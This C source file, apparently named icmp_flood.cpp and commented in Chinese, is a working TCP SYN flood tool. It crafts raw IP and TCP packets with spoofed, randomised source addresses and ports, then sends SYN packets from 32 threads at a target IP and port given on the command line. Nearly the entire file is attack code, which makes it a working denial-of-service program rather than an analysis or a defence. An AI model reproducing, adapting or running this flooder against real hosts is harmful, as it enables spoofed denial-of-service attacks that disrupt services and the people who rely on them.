/*
 * icmp_flood.cpp
 *
 *  Created on: 2016年10月21日
 *      Author: hanlon
 */

#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h> 		// bzero
#include <signal.h>			// signal
#include <pthread.h>
#include <stdlib.h>			// void srand(unsigned seed) ; int rand(void);
#include <sys/syscall.h>	// syscall(SYS_gettid)

#include <sys/socket.h>
#include <netinet/in.h>		// 	socket  AF_INET SOCK_RAW  IPPROTO_ICMP
#include <netinet/ip.h>		// 	struct ip
#include <netinet/ip_icmp.h>// 	struct icmp  ICMP_ECHO ICMP_ECHOREPLY
#include <netinet/tcp.h>	//	struct tcphdr
#include <netinet/udp.h>	// 	struct udphdr
#include <arpa/inet.h>		// 	inet_ntoa(struct in_addr>>字符串) inet_addr(字符串>>长整型)
							//  struct in_addr 是 struct sockaddr_in的成员 sin_addr 类型
							//  struct sockaddr_in 是 struct sockaddr 在以太网的具体实现
#include <netdb.h>			// 	getprotobyname gethostbyname
#include <net/if.h>			//  IFNAMSIZ   struct ifreq
#include <linux/sockios.h>	//  SIOCGIFADDR  /*  Socket configuration controls. */



static int rawsock = 0;					/*发送和接收线程需要的socket描述符*/
static int alive = 0;
static struct sockaddr_in target_addr ;
#define ATTACK_THREAD_COUNT 32
#define ATTACK_DATA_LENGTH 20
#define ATTACK_INTERVAL_PER_THREAD 100 // 100 second 
struct tcp_sync_flood
{
	struct ip ip_header;
	struct tcphdr tcp_header;
	unsigned char data[ATTACK_DATA_LENGTH];
};


struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
};


static int step = 0 ; 

// 产生某个范围内的随机数 [begin,end] 包含begin和end
static inline int random_src_addr(int begin , int end ){
	int gap = end - begin + 1 ;
	
	srand((unsigned int)time(0) + (++step) );
	return random()%gap + begin ;
}

static unsigned short crc16_cksum(unsigned char *data,  int len)
{
	int sum=0;
	int odd = len & 0x01;
	while( len & 0xfffe)  {
		sum += *(unsigned short*)data;
		data += 2;
		len -=2;
	}
	if( odd) {
		unsigned short tmp = ((*data)<<8)&0xff00;
		sum += tmp;
	}
	
	sum = (sum >>16) + (sum & 0xffff);
	sum += (sum >>16) ;
	return ~sum;
}

static unsigned short crc16_cksum_tcp(unsigned char* pesudo , int pesudo_len, unsigned char *data,  int data_len)
{
	int sum=0;
	
	int odd = pesudo_len & 0x01;
	while( pesudo_len & 0xfffe)  {
		sum += *(unsigned short*)pesudo;
		pesudo += 2;
		pesudo_len -=2;
	}
	if( odd) {
		unsigned short tmp = ((*pesudo)<<8)&0xff00;
		sum += tmp;
	}
	
	odd = data_len & 0x01;
	while( data_len & 0xfffe)  {
		sum += *(unsigned short*)data;
		data += 2;
		data_len -=2;
	}
	if( odd) {
		unsigned short tmp = ((*data)<<8)&0xff00;
		sum += tmp;
	}
	
	
	sum = (sum >>16) + (sum & 0xffff);
	sum += (sum >>16) ;
	return ~sum;
}


static void tcp_pack(struct tcphdr *tcph, int length , short dest_port , struct sockaddr_in src , struct sockaddr_in dest )
{
#define TCP_HEADER_LEN 20

	/*设置报头*/
	tcph->source= 	htons( random_src_addr(10000,65535) );  // 随机端口号 伪端口
	tcph->dest 	= 	htons( dest_port ) ;  
	tcph->seq 	= 	htonl( random_src_addr(0,100) );
	tcph->ack_seq 	= 0;
	tcph->doff 		= TCP_HEADER_LEN / 4 ;

	tcph->fin = 0;			//	关闭链接
	tcph->syn = 1;  		//	发起一个TCP连接
	tcph->rst = 0 ; 		//	重建链接
	tcph->psh = 0 ; 		//	尽快交给用户层
	tcph->ack = 0 ;
	//tcph->urg = 1 ; 		//	紧急指针字段
	tcph->urg = 0 ;
	
	tcph->window = htons( random_src_addr(0,65535) ) ;
	tcph->check =  0 ;
	//tcph->urg_ptr = random_src_addr(0,65535);
	tcph->urg_ptr = 0 ;

	unsigned char* tcp_data = (unsigned char* )tcph + TCP_HEADER_LEN ;
	unsigned char i = 0;
	for(i = 0; i< length; i++){
		tcp_data[i] = i;
	}
	
	// TCP 校验和 需要 伪首部
	// 源IP地址(32bit)、目的IP地址(32bit)、保留字节(置0)、传输层协议号(TCP是6)、TCP报文长度(报头+数据)
	struct pseudo_header psh;
	psh.source_address = src.sin_addr.s_addr;
	psh.dest_address = dest.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons( sizeof(struct tcphdr) + length );
	

	tcph->check =  crc16_cksum_tcp(
									(unsigned char*)&psh, sizeof(struct pseudo_header) , 
									(unsigned char*)tcph, sizeof(struct tcphdr) + length ) ;

 
}

static void ip_pack(struct ip * ipheader , struct sockaddr_in src , struct sockaddr_in dest , int total_len )
{
#define IP_HEADER_LEN 20

	unsigned char i = 0;
	ipheader->ip_v = 4 ;
	ipheader->ip_hl = IP_HEADER_LEN /4 ;
	ipheader->ip_tos = 0 ;
	ipheader->ip_len = htons( total_len ); // 这里是否加hton没有影响的??
	ipheader->ip_id = htons(syscall(SYS_gettid)&0x0000FFFF) ;
	unsigned short off = IP_DF | (0 & IP_OFFMASK ) ; // do not Fragmant
	ipheader->ip_off = htons (off);
	ipheader->ip_ttl = 64 ;
	ipheader->ip_p = IPPROTO_TCP; // 修改上层协议 ICMP TCP
	ipheader->ip_sum = 0 ;
	ipheader->ip_src = src.sin_addr ;
	ipheader->ip_dst = dest.sin_addr ;

	ipheader->ip_sum = crc16_cksum((unsigned char*)ipheader, IP_HEADER_LEN );
	
}



static void* flood_send(void *argv)
{
	short dest_port = (long)argv ;
	printf("dest_port = %d \n", dest_port );
	struct tcp_sync_flood attracker;
	memset(&attracker , 0 , sizeof(struct tcp_sync_flood) );
	int seq = 0 ;
	while(alive)
	{
		struct sockaddr_in random_src  ;
		// 情况1 如果是本地IP 那么端口不存在 那么就会立刻回复RST
		// 情况2 如果IP地址是A/B/C类 那么可能就没有 SYNC-ACK 
		// 情况3 如果IP地址是D/E类  会立刻获得SYNC-ACK (223..) 
		// 测试情况 可用 hping3  
		random_src.sin_addr.s_addr  =  (230&0x000000FF)
						+ ((18 << 8)&0x0000FF00)
						+ ((3 << 16)&0x00FF0000)
						+ ((random_src_addr(1,254) << 24)&0xFF000000) ;
		//random_src.sin_addr.s_addr  =  (192&0x000000FF)
		//				+ ((168 << 8)&0x0000FF00)
		//				+ ((11  << 16)&0x00FF0000)
		//				+ ((random_src_addr(1,254)  << 24)&0xFF000000) ;
		printf("random src %s [%ld]\n" , inet_ntoa(random_src.sin_addr)  , syscall(SYS_gettid));

		tcp_pack((struct tcphdr *)&attracker.tcp_header,  ATTACK_DATA_LENGTH  , dest_port , random_src , target_addr );
		ip_pack((struct ip*)&attracker.ip_header , random_src , target_addr  ,
					sizeof(struct ip) + sizeof(struct tcphdr) + ATTACK_DATA_LENGTH   );

		int size = 0;
		size = sendto (rawsock,
						&attracker,
						sizeof(struct ip) + sizeof(struct tcphdr) + ATTACK_DATA_LENGTH ,
						0, /*flag */
						(struct sockaddr *)&target_addr, sizeof(target_addr) );
		if(size <0){
			perror("sendto error");
			sleep(10);
			continue;
		}
		sleep(ATTACK_INTERVAL_PER_THREAD);
	}
	return NULL;
}

static void stop_flood_sigint(int signo)
{
	printf("stop flood \n");
	alive = 0;
	return;
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	int ret = 0 ;


	printf("sizeof(struct ip) = %zd\n" , sizeof(struct ip) );
	printf("sizeof(struct tcphdr) = %zd\n" , sizeof(struct tcphdr) );
	printf("sizeof(struct icmp) = %zd\n" , sizeof(struct icmp) );

	/*
	 * 	sizeof(struct ip) = 20
		sizeof(struct tcphdr) = 20
		sizeof(struct icmp) = 28 <= icmp需要特别注意其大小
	 *
	 * */

	bzero(&target_addr, sizeof(target_addr));
	target_addr.sin_family = AF_INET;
	in_addr_t inaddr = inet_addr(argv[1]); // 输入的目的地址为字符串IP地址
	if(inaddr == INADDR_NONE){
		printf("usage : ./flood 192.168.1.1 8086\n");
		return -1 ;
	}else{		// 为IP地址字符串
		memcpy((char*)&target_addr.sin_addr, &inaddr, sizeof(inaddr));
	}
	target_addr.sin_port = htons( atoi(argv[2]) );
	printf("Target>>>(%d.%d.%d.%d)%d\n",
		(target_addr.sin_addr.s_addr&0x000000FF)>>0,
		(target_addr.sin_addr.s_addr&0x0000FF00)>>8,
		(target_addr.sin_addr.s_addr&0x00FF0000)>>16,
		(target_addr.sin_addr.s_addr&0xFF000000)>>24,  atoi(argv[2]) );

	protocol = getprotobyname("tcp");
	if (protocol == NULL){
		perror("getprotobyname()");
		return -1;
	}else{
		printf("getprotobyname %s %d\n", protocol->p_name, protocol->p_proto);
	}

	rawsock = socket(AF_INET, SOCK_RAW,  protocol->p_proto);
	if(rawsock < 0){
		perror("create socket error");
		return -1;
	}

	int set = 1 ;
	protocol = getprotobyname("ip");
	if (protocol == NULL){
		perror("getprotobyname()");
		return -1;
	}else{
		printf("getprotobyname %s %d\n", protocol->p_name, protocol->p_proto);
	}
	ret = setsockopt(rawsock, protocol->p_proto/*IPPROTO_IP*/, IP_HDRINCL, &set, sizeof(set));
	if( ret < 0 ){
		perror("setsockopt IP_HDRINCL error");
		return -1 ;
	}

	signal(SIGINT, stop_flood_sigint);
	alive = 1;
	pthread_t attack_thread_group[ATTACK_THREAD_COUNT];
	int err = 0;

	// 创建 ATTACK_THREAD_COUNT 个线程 每个线程每隔 ATTACK_INTERVAL_PER_THREAD 秒发送一次SYNC 直到Ctrl+C
	int i = 0 ;
	for( i = 0 ; i < ATTACK_THREAD_COUNT ; i++ ){
		err = pthread_create(&attack_thread_group[i], NULL, flood_send,  (void*)(long)atoi(argv[2]) );
		if(err < 0){
			attack_thread_group[i] = -1 ;
			printf("pthread_create %d error \n" , i);
		}else{
			//sleep(1); // time(0) random
			printf("pthread_create %d ok \n" , i);
		}
	}

	for( i = 0 ; i < ATTACK_THREAD_COUNT ; i++ ){
		if( attack_thread_group[i] != -1 ){
			err = pthread_join(attack_thread_group[i], NULL);
			if(err < 0){
				printf("pthread_join %d error \n" , i);
			}else{
				printf("pthread_join %d ok\n" , i);
			}
		}
	}
	close(rawsock);

	return 0;
}



